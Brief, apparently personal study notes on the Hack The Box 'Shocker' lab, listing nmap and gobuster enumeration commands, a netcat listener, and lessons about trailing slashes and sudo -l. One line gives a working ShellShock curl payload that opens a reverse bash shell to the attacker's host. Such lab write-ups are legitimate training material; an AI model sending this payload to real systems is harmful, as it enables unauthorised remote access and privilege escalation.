# Shocker
* Link: https://app.hackthebox.com/machines/Shocker
* Type: Linux
* Difficulty: Easy

## Commands Used
* *nmap -sC -sV -oA OUTPUTDIR IPADDRESS* - Nmap scan.
* *nc -nlvp 4444* - Starts a listener.
* *gobuster dir -f /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u IPADDRESS/* - *-f* is used to bypass some security control where when adding */* after directory name it gets treated as a file.
* *gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56/cgi-bin/ -x sh,cgi*
* curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/MYIP/MYPORT 0>&1' http://TARGETIP/cgi-bin/user.sh - ShellShock Exploits
* In Linux:
  - *sudo -l* - Provide you with what you can run as a user with root privileges.
  - 


## Steps
* nmap to enumrate the host. 


## Why is the machine vulnerable
* The Machine is not patched/updated.

## Important Lessons
* It seems that if we don’t add the “/” at the end of the URL, the server is interpreting it as a file instead of a directory. (i.e. *IP/cgi-bin* doesn't work but *IP/cgi-bin/* Works fine) (Use *-f* flag with gobuster to do it automatically)
* If you run something with root privileges the thing ran will have root privileges (i.e. run a reverse shell as root to get root.)
* Sometimes even if you can't access a specific directory you can access files in that directory.
* *sudo -l* - Provide you with what you can run as a user with root privileges.
